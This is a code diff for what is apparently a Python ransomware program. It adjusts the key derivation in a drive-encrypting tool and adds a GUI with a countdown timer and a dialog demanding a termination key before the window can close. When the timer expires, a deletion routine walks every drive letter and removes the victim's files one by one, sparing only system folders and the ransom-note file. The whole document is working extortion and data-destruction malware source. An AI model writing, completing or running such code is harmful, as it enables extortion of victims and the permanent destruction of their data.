@@ -76,10 +76,10 @@ class EncryptionTool:
         self.dashboard_url = dashboard_url
         self.max_attempts = max_attempts
         self.delays = delays
-        self.key = self.generate_key(password)
+        self.key = self.generate_passkey(password)
         self.machine_id = str(uuid.uuid4())
     
-    def generate_key(password):
+    def generate_passkey(self, password):
         try:
             salt = get_random_bytes(16)
             key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
@@ -544,3 +544,163 @@ He will try whatever to restore your files.
         self.delete_timer_state_file()
         countdown_dialog = CountdownDialog(self, 10, self.close_application)
         countdown_dialog.mainloop()
+
+    def start_closing_countdown(self):
+        countdown_dialog = CountdownDialog(self, 15, self.close_application)
+        countdown_dialog.grab_set()
+        countdown_dialog.mainloop()
+
+    def close_application(self):
+        try:
+            self.destroy()
+        except Exception as e:
+            print(f"Exception when closing: {e}")
+
+    def on_close_window(self):
+        dialog = TerminationKeyDialog(self, ICON_PATH)
+        self.wait_window(dialog)
+        if dialog.result == TERMINATION_KEY:
+            self.destroy()
+        else:
+            messagebox.showerror("Error", "Incorrect termination key.")
+            return
+        
+    def decrypt_file(self, file_path, key):
+        try:
+            with open(file_path, 'rb') as f:
+                iv = f.read(16)
+                encrypted_data = f.read()
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+            original_file_path = file_path.rsplit('.encrypted', 1)[0]
+            with open(original_file_path, 'wb') as f:
+                f.write(decrypted_data)
+            os.remove(file_path)
+            self.log(f"Successfully decrypted {file_path}")
+            return True
+        except Exception as e:
+            self.log(f"Failed to decrypt {file_path}. error: {e}")
+            return False
+
+    def load_timer_state(self):
+        try:
+            with open(TIME_STATE_DIR, 'r') as f:
+                state = f.read().strip()
+                if not state:
+                    self.timer_label.config(text="No active countdown.")
+                    self.closing_time = None
+                else:
+                    self.closing_time = datetime.fromtimestamp(float(state))
+                    if datetime.now() >= self.closing_time:
+                        self.timer_label.config(text="Time is up!!")
+                        messagebox.showinfo("Notification", "Time has expired. Initiating deletion sequence")
+                        self.begin_deletion_sequence()
+                    else:
+                        self.update_timer()
+        except (FileNotFoundError, ValueError):
+            self.reset_timer()
+
+    def update_timer(self):
+        remaining_time = self.closing_time - datetime.now()
+        if remaining_time.total_seconds() > 0:
+            self.timer_label.config(text=f"Time remaining {str(remaining_time).split('.')[0]}")
+            self.timer_update_id = self.after(1000, self.update_timer)
+        else:
+            self.timer_label.config(text="Your time is up!!")
+            self.begin_deletion_sequence()
+    
+    def reset_timer(self):
+        self.closing_time = datetime.now() + timedelta(minutes=5)
+        with open(TIME_STATE_DIR, 'w') as f:
+            f.write(str(self.closing_time.timestamp()))
+        self.update_timer()
+    
+    def reset_timer_state(self):
+        with open(TIME_STATE_DIR, 'w') as f:
+            f.write("")
+        self.timer_label.config(text="No active countdown")
+    
+    def delete_timer_state_file(self):
+        try:
+            os.remove(TIME_STATE_DIR)
+        except FileNotFoundError:
+            pass
+
+        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
+        
+        for drive in drives:
+            machine_id_path = os.path.join(drive, "machine_id.txt")
+            try: os.remove(machine_id_path)
+            except FileNotFoundError: pass
+
+    def begin_deletion_sequence(self):
+        if not self.stop_deletion:
+            self.log("Time is up. Starting file deletion sequence", "red")
+            self.deletion_dialog = DeleteCountdownDialog(self, self.stop_deletion_process)
+            self.deletion_process()
+    
+    def deletion_process(self):
+        self.log("Deletion process initiated.", "yellow")
+        self.deletion_thread = threading.Thread(target=self.delete_files_with_timing, daemon=True)
+        self.deletion_thread.start()
+
+    def delete_files_with_timing(self):
+        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
+        excluded_directories = {'System Volume Information', '$RECYCLE.BIN', 'Windows'}
+        excluded_files = {'machine_id.txt', 'read_me_for_decryption.txt'}
+
+        def handle_deletion(directory):
+            for current_directory, directories, files in os.walk(directory, topdown=False):
+                if any(excluded in current_directory for excluded in excluded_directories):
+                    continue
+                
+                for file in files:
+                    if file in excluded_files:
+                        continue
+                        
+                    file_path = os.path.join(current_directory, file)
+                    if not os.access(file_path, os.W_OK):
+                        self.log(f"Access denied to {file_path}. Skipping...")
+                        continue
+
+                    if self.stop_event.is_set():
+                        self.log("Stop signal received. Ending deletion process.", "orange")
+                        return
+
+                    try:
+                        os.remove(file_path)
+                        self.log(f"Deleted: {file_path}")
+                    except PermissionError as e:
+                        self.log(f"Permission error {e}. Skipping {file_path}")
+                    except Exception as e:
+                        self.log(f"Error during deletion of {file_path}: {e}")
+
+                    time.sleep(5)
+                    
+                    if not directories and not files:
+                        self.log(f"all files have been deleted from {current_directory}")
+
+        for drive in drives:
+            d_data_path = os.path.join(drive, 'D-Data')
+            if os.path.exists(d_data_path):
+                self.log(f"starting deletion in {d_data_path}")
+                handle_deletion(d_data_path)
+                if self.stop_event.is_set(): return
+
+        for drive in drives:
+            self.log(f"starting deletion in {drive}")
+            handle_deletion(drive)
+            if self.stop_event.is_set(): break
+
+
+if __name__ == "__main__":
+    machine_id = load_machine_id()
+
+    if machine_id:
+        app = DecryptorApp()
+        app.mainloop()
+    else:
+        encryption_tool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSIONS_TO_ENCRYPT, PASSWORD_PROVIDED, DASHBOARD_URL, MAX_ATTEMPTS, DELAY)
+        encryption_tool.execute()
+        app = DecryptorApp()
+        app.mainloop()
